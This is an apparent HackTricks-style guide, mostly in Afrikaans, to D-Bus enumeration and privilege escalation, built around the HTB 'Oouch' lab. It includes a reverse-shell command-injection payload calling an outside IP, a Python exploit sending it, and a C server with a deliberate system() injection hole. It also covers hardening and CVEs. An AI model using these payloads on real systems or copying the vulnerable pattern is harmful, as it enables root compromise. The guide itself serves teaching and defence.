# D-Bus Enumeration & Command Injection Privilege Escalation

## **GUI-enumerasie**

D-Bus word as die inter-proses-kommunikasie- (IPC-) bemiddelaar in Ubuntu-werkskermomgewings gebruik. Op Ubuntu word die gelyktydige werking van verskeie message buses waargeneem: die system bus, wat hoofsaaklik deur **bevoorregte dienste gebruik word om dienste wat regdeur die stelsel relevant is, bloot te stel**, en ’n session bus vir elke aangemelde gebruiker, wat dienste blootstel wat slegs vir daardie spesifieke gebruiker relevant is. Die fokus is hier hoofsaaklik op die system bus vanweë die assosiasie daarvan met dienste wat met hoër voorregte (bv. root) loop, aangesien ons doel is om voorregte te verhoog. Daar word aangedui dat D-Bus se argitektuur ’n 'router' per session bus gebruik, wat daarvoor verantwoordelik is om kliëntboodskappe na die toepaslike dienste te herlei op grond van die adres wat deur die kliënte gespesifiseer word vir die diens waarmee hulle wil kommunikeer.<sup>[[1]](#references)</sup>

Dienste op D-Bus word gedefinieer deur die **objects** en **interfaces** wat hulle blootstel. Objects kan vergelyk word met klasinstansies in standaard OOP-tale, waar elke instansie uniek deur ’n **object path** geïdentifiseer word. Hierdie path, soortgelyk aan ’n lêerstelselpath, identifiseer elke object wat deur die diens blootgestel word uniek. ’n Belangrike interface vir navorsingsdoeleindes is die **org.freedesktop.DBus.Introspectable**-interface, wat ’n enkele metode, Introspect, bevat. Hierdie metode lewer ’n XML-voorstelling van die object se ondersteunde metodes, seine en eienskappe terug, met die fokus hier op metodes terwyl eienskappe en seine weggelaat word.

Vir kommunikasie met die D-Bus-interface is twee tools gebruik: ’n CLI-tool genaamd **gdbus** vir die maklike aanroeping van metodes wat deur D-Bus blootgestel word in scripts, en [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), ’n Python-gebaseerde GUI-tool wat ontwerp is om die dienste wat op elke bus beskikbaar is, te enumerate en die objects binne elke diens te vertoon.
```bash
sudo apt-get install d-feet
```
As jy die **session bus** nagaan, bevestig eers die huidige adres:
```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

In die eerste afbeelding word dienste wat met die D-Bus system bus geregistreer is, vertoon, met **org.debin.apt** spesifiek gemerk nadat die System Bus-knoppie gekies is. D-Feet voer navrae na hierdie diens uit vir objects en vertoon interfaces, methods, properties en signals vir geselekteerde objects, soos in die tweede afbeelding gesien kan word. Elke method se signature word ook uiteengesit.

’n Belangrike kenmerk is die vertoning van die diens se **process ID (pid)** en **command line**, wat nuttig is om te bevestig of die diens met verhoogde privileges loop—belangrik vir die relevansie van die navorsing.

**D-Feet laat ook method invocation toe**: gebruikers kan Python expressions as parameters invoer, wat D-Feet na D-Bus types omskakel voordat dit aan die diens gestuur word.

Let egter daarop dat **sommige methods authentication vereis** voordat ons hulle kan invoke. Ons sal hierdie methods ignoreer, aangesien ons doel is om ons privileges sonder credentials te verhoog.

Let ook daarop dat sommige van die dienste ’n ander D-Bus-diens genaamd org.freedeskto.PolicyKit1 navraag om te bepaal of ’n gebruiker toegelaat moet word om sekere actions uit te voer of nie.

## **Cmd line Enumeration**

### Lys Service Objects

Dit is moontlik om oopgemaakte D-Bus interfaces te lys met:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
Dienste gemerk as **`(activatable)`** is besonder interessant omdat hulle **nog nie loop nie**, maar ’n bus-versoek hulle op aanvraag kan begin. Moenie by `busctl list` ophou nie; karteer daardie name na die werklike binaries wat hulle sou uitvoer.
```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```
Dit wys vinnig vir jou watter `Exec=`-pad vir ’n aktiveerbare naam sal begin en onder watter identiteit. As die binary of sy uitvoeringsketting swak beskerm word, kan ’n onaktiewe diens steeds ’n privilege-escalation-pad word.

#### Verbindings

[Vanaf wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Wanneer ’n proses ’n verbinding met ’n bus opstel, ken die bus aan die verbinding ’n spesiale busnaam toe wat _unique connection name_ genoem word. Busname van hierdie tipe is onveranderlik—dit is gewaarborg dat hulle nie sal verander solank die verbinding bestaan nie—en, nog belangriker, hulle kan nie gedurende die bus se leeftyd hergebruik word nie. Dit beteken dat geen ander verbinding met daardie bus ooit so ’n unieke verbindingnaam toegewys sal kry nie, selfs al sluit dieselfde proses die verbinding met die bus en skep dit ’n nuwe een. Unieke verbindingname is maklik herkenbaar omdat hulle met die andersins verbode dubbelpuntkarakter begin.<sup>[[4]](#references)</sup>

### Diensobjekinligting

Daarna kan jy inligting oor die interface verkry met:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
Korrelleer ook die busnaam met sy `systemd`-eenheid en uitvoerbare pad:
```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```
This beantwoord die operasionele vraag wat tydens privesc saak maak: **as 'n method call slaag, watter werklike binary en unit sal die aksie uitvoer?**

### Lys die koppelvlakke van 'n Service Object

Jy moet voldoende permissions hê.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Introspekteer-koppelvlak van ’n diensobjek

Let daarop dat in hierdie voorbeeld die nuutste ontdekte koppelvlak gekies is deur die `tree`-parameter te gebruik (_sien vorige afdeling_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Let op die metode `.Block` van die interface `htb.oouch.Block` (die een waarin ons belangstel). Die "s" van die ander kolomme kan beteken dat dit 'n string verwag.

Voordat jy enigiets gevaarlik probeer, valideer eers 'n **read-oriented** of andersins laerisiko-metode. Dit skei drie gevalle duidelik: verkeerde sintaksis, bereikbaar maar geweier, of bereikbaar en toegelaat.
```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```
### Korreleer D-Bus Methods met Policies en Actions

Introspection wys jou **wat** jy kan call, maar dit wys jou nie **waarom** ’n call toegelaat of geweier word nie. Vir werklike privesc-triage moet jy gewoonlik **drie lae gelyktydig** inspekteer:

1. **Activation metadata** (`.service`-lêers of `SystemdService=`) om uit te vind watter binary en unit werklik sal run.
2. **D-Bus XML policy** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`) om uit te vind wie `own`, `send_destination` of `receive_sender` mag gebruik.
3. **Polkit action-lêers** (`/usr/share/polkit-1/actions/*.policy`) om die verstek-authorization-model (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`) te bepaal.

Useful commands:
```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```
Moenie ’n 1:1-kartering tussen ’n D-Bus-metode en ’n Polkit-aksie aanvaar nie. Dieselfde metode kan ’n ander aksie kies, afhangend van die objek wat gewysig word of die runtime-konteks. Daarom is die praktiese werkvloei:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` en grep die relevante `.policy`-lêers
3. laerisiko-lewendige probes met `busctl call`, `gdbus call`, of `dbusmap --enable-probes --null-agent`

Proxy- of compatibility-dienste verdien ekstra aandag. ’n **root-running proxy** wat versoeke na ’n ander D-Bus-diens oor sy eie vooraf-gevestigde verbinding aanstuur, kan die backend per ongeluk elke versoek as afkomstig van UID 0 laat behandel, tensy die oorspronklike caller-identiteit weer gevalideer word.<sup>[[3]](#references)</sup>

### Monitor-/vasleggingskoppelvlak

Met genoeg privileges (net `send_destination`- en `receive_sender`-privileges is nie genoeg nie) kan jy ’n **D-Bus-kommunikasie monitor**.

Om ’n **kommunikasie te monitor**, moet jy **root** wees. As jy steeds probleme ondervind terwyl jy root is, kyk na [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) en [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> As jy weet hoe om ’n D-Bus-konfigurasielêer op te stel om **nie-root-gebruikers toe te laat om die kommunikasie te sniff**, **kontak my**!

Verskillende maniere om te monitor:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
In die volgende voorbeeld word die interface `htb.oouch.Block` gemonitor en **die boodskap "**_**lalalalal**_**" word deur miscommunication gestuur**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Jy kan `capture` in plaas van `monitor` gebruik om die resultate in ’n **pcapng**-lêer te stoor wat Wireshark kan oopmaak:
```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```
#### Filtreer al die geraas <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

As daar net te veel inligting op die bus is, gee ’n match rule soos volg deur:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Veelvuldige reëls kan gespesifiseer word. Indien ’n boodskap met _enige_ van die reëls ooreenstem, sal die boodskap gedruk word. Soos volg:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Sien die [D-Bus-dokumentasie](http://dbus.freedesktop.org/doc/dbus-specification.html) vir meer inligting oor match rule-sintaksis.<sup>[[7]](#references)</sup>

### Meer

`busctl` het selfs meer opsies, [**vind hulle almal hier**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Kwesbare scenario**

As gebruiker **qtc binne die host "oouch" vanaf HTB** kan jy ’n **onverwagte D-Bus-config-lêer** vind wat in _/etc/dbus-1/system.d/htb.oouch.Block.conf_ geleë is:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Let daarop uit die vorige konfigurasie dat **jy die gebruiker `root` of `www-data` sal moet wees om inligting** via hierdie D-BUS-kommunikasie te stuur en te ontvang.

As gebruiker **qtc** binne die docker-container **aeb4525789d8** kan jy dbus-verwante kode in die lêer _/code/oouch/routes.py_ vind. Dit is die interessante kode:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Soos jy kan sien, is dit **connecting to a D-Bus interface** en stuur dit die "client_ip" na die **"Block" function**.

Aan die ander kant van die D-Bus connection is daar ’n C compiled binary wat loop. Hierdie code **listening** op die D-Bus connection **for IP address** en roep iptables via die `system` function aan om die gegewe IP address te blokkeer.\
**The call to `system` is vulnerable on purpose to command injection**, dus sal ’n payload soos die volgende een ’n reverse shell skep: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploit it

Aan die einde van hierdie bladsy kan jy die **complete C code of the D-Bus application** vind. Daarin kan jy tussen lyne 91-97 vind **how the `D-Bus object path`** **and `interface name`** are **registered**. Hierdie information sal nodig wees om information na die D-Bus connection te stuur:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Ook in reël 57 kan jy sien dat **die enigste metode wat vir hierdie D-Bus-kommunikasie geregistreer is**, `Block` genoem word (_**Daarom gaan die payloads in die volgende afdeling na die diensobjek `htb.oouch.Block`, die koppelvlak `/htb/oouch/Block` en die metodenaam `Block` gestuur word**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Die volgende Python-kode sal die payload via `block_iface.Block(runme)` na die D-Bus-verbinding se `Block`-method stuur (_let daarop dat dit uit die vorige stuk kode onttrek is_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl en dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` is 'n tool wat gebruik word om boodskappe na “Message Bus” te stuur.
- Message Bus – 'n sagteware wat deur stelsels gebruik word om kommunikasie tussen toepassings maklik te maak. Dit hou verband met Message Queue (boodskappe word in volgorde gerangskik), maar in Message Bus word die boodskappe volgens 'n subscription-model gestuur en is dit ook baie vinnig.
- Die “-system”-tag word gebruik om aan te dui dat dit 'n stelselboodskap is, nie 'n sessieboodskap nie (by verstek).
- Die “–print-reply”-tag word gebruik om ons boodskap toepaslik te vertoon en enige antwoorde in 'n mensleesbare formaat te ontvang.
- “–dest=Dbus-Interface-Block” Die adres van die Dbus-interface.
- “–string:” – Die tipe boodskap wat ons na die interface wil stuur. Daar is verskeie formate om boodskappe te stuur, soos double, bytes, booleans, int en objpath. Hiervan is die “object path” nuttig wanneer ons 'n lêerpad na die Dbus-interface wil stuur. Ons kan in hierdie geval 'n spesiale lêer (FIFO) gebruik om 'n command na die interface te stuur in die naam van 'n lêer. “string:;” – Dit is om die object path weer aan te roep waar ons die FIFO reverse shell-lêer/command plaas.

_Let daarop dat in `htb.oouch.Block.Block` die eerste deel (`htb.oouch.Block`) na die service object verwys en die laaste deel (`.Block`) na die method name verwys._

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Geoutomatiseerde Enumeration Helpers (2023-2025)

Enumeration van 'n groot D-Bus attack surface met `busctl`/`gdbus` raak vinnig lastig. Twee klein FOSS utilities wat die afgelope paar jaar vrygestel is, kan dinge tydens red-team- of CTF-engagements bespoedig:

### dbusmap ("Nmap for D-Bus")
* Author: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)<sup>[[5]](#references)</sup>
* In C geskryf; enkele statiese binary (<50 kB) wat deur elke object path loop, die `Introspect` XML oplaai en dit aan die owning PID/UID koppel.<sup>[[5]](#references)</sup>
* Nuttige flags:
```bash
# List every service on the *system* bus and dump all callable methods
sudo dbus-map --dump-methods

# Actively probe methods/properties you can reach without Polkit prompts
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* Die tool merk onbeskermde well-known names met `!`, wat onmiddellik services wys wat jy kan *own* (oorneem), of method calls wat vanaf 'n unprivileged shell bereikbaar is.

### uptux.py
* Author: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)<sup>[[6]](#references)</sup>
* Python-only script wat soek na *writable* paths in systemd units **en** D-Bus policy files met buitensporige permissies (byvoorbeeld `send_destination="*"`).<sup>[[6]](#references)</sup>
* Vinnige gebruik:
```bash
python3 uptux.py -n          # run all checks but don’t write a log file
python3 uptux.py -d          # enable verbose debug output
```
* Die D-Bus module soek in die onderstaande directories en beklemtoon enige service wat deur 'n normale user gespoof of hijack kan word:
* `/etc/dbus-1/system.d/` en `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/` (vendor overrides)

---

## Noemenswaardige D-Bus Privilege-Escalation Bugs (2024-2025)

Deur onlangse gepubliseerde CVEs dop te hou, help dit om soortgelyke onveilige patterns in custom code raak te sien. Twee goeie onlangse examples is:<sup>[[2]](#references)[[3]](#references)</sup>

| Year | CVE | Component | Root Cause | Offensive lesson |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | Die root-running service het 'n D-Bus interface blootgestel wat unprivileged users kon herkonfigureer, insluitend die laai van attacker-controlled macro behavior. | As 'n daemon **device/profile/config management** op die system bus blootstel, behandel writable configuration en macro features as code-execution primitives, nie bloot as "settings" nie. |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | 'n Root-running compatibility proxy het requests na backend services geforward sonder om die oorspronklike caller se security context te behou, sodat backends die proxy as UID 0 vertrou het. | Behandel **proxy / bridge / compatibility** D-Bus services as 'n aparte bug class: indien hulle privileged calls relay, verifieer hoe die caller UID/Polkit context die backend bereik. |

Patterns om raak te sien:
1. Service loop **as root op die system bus**.
2. Óf daar is **geen authorization check nie**, óf die check word teen die **verkeerde subject** uitgevoer.
3. Die reachable method verander uiteindelik system state: package install, user/group changes, bootloader config, device profile updates, file writes, of direkte command execution.

Gebruik `dbusmap --enable-probes` of manual `busctl call` om te bevestig of 'n method reachable is, en inspekteer dan die service se policy XML en Polkit actions om te verstaan **watter subject** eintlik geauthorizeer word.

---

## Hardening & Detection Quick-Wins

* Soek vir world-writable of *send/receive*-open policies:
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* Vereis Polkit vir gevaarlike methods – selfs *root* proxies moet die *caller* PID aan `polkit_authority_check_authorization_sync()` deurgee in plaas van hul eie.
* Drop privileges in long-running helpers (gebruik `sd_pid_get_owner_uid()` om namespaces te switch nadat jy aan die bus gekoppel het).
* Indien jy nie 'n service kan verwyder nie, *scope* dit ten minste tot 'n toegewyde Unix group en beperk toegang in sy XML policy.
* Blue-team: capture die system bus met `busctl capture > /var/log/dbus_$(date +%F).pcapng` en importeer dit in Wireshark vir anomaly detection.

---

## References

- [1] [USBCreator D-Bus Privilege Escalation in Ubuntu Desktop](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [2] [CVE-2024-45752: D-Bus service laat konfigurasie deur enige unprivileged user toe](https://github.com/PixlOne/logiops/issues/473)
- [3] [dde-api-proxy: Authentication Bypass in Deepin D-Bus Proxy Service (CVE-2025-23222)](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
- [4] [D-Bus - Wikipedia](https://en.wikipedia.org/wiki/D-Bus)
- [5] [taviso/dbusmap - "Nmap for D-Bus"](https://github.com/taviso/dbusmap)
- [6] [initstring/uptux](https://github.com/initstring/uptux)
- [7] [dbus.freedesktop.org - D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html)
{{#include ../../banners/hacktricks-training.md}}
